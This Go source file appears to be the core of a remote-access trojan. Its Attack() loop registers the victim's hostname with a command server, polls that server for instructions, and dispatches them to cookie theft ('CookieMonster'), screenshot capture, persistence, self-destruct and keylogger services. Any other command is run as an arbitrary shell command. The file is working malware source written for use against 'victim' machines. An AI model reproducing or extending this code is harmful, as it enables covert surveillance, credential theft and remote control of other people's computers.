package services

import (
	"fmt"
	"main/utils"
	"os"
	"regexp"
	"sync"
	"time"
)

type Service interface {
	Run(victim string)
}

type ClosableService interface {
	Service
	Terminate()
}

const (
	NoActionMessage = "No action"
	ActionKey       = "action"
	BodyKey         = "body"
	StopAction      = "stop-(keylog|lazyKeylog)"
)

var (
	actions = map[string]Service{
		"cookies":       &CookieMonster{},
		"screenshot":    &ScreenshotService{},
		"persist":       &PersistService{},
		"self-destruct": &SelfDestruct{},
	}

	stoppableActions = map[string]ClosableService{
		"keylog":     &Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})},
		"lazyKeylog": &LazyKeylogger{Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})}},
	}
	shellService = &ShellService{}
)

func Attack() {
	name, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname")
	}
	for {
		fmt.Println("Establishing connnection...")
		utils.EstablishConnection(name)
		for {
			time.Sleep(10 * time.Second)
			resp, err := utils.HandleCommandsRequest(name)
			if err != nil {
				fmt.Println("Error making the request, establishing another request")
				break
			}
			if val, _ := regexp.Match(StopAction, []byte(resp[ActionKey])); val {
				stoppableActions[utils.ParseStopCommand(resp[ActionKey])].Terminate()
			} else if resp[ActionKey] != NoActionMessage {
				if actions[resp[ActionKey]] != nil {
					actions[resp[ActionKey]].Run(name)
				} else if stoppableActions[resp[ActionKey]] != nil {
					stoppableActions[resp[ActionKey]].Run(name)
				} else {
					shellService.Run(utils.ParseShellCommand(resp[ActionKey]), name)
				}
			}
		}
	}
}
